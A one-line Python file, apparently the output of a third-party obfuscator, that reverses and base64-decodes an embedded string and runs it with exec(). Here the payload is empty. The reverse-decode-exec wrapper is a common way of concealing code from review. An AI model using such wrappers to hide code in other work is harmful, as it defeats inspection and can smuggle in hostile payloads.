# Obfuscated By Axak 
# https://www.github.com/PaNdAxAk 
# Time : Wed Jun 29 23:24:36 2022 

_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=='))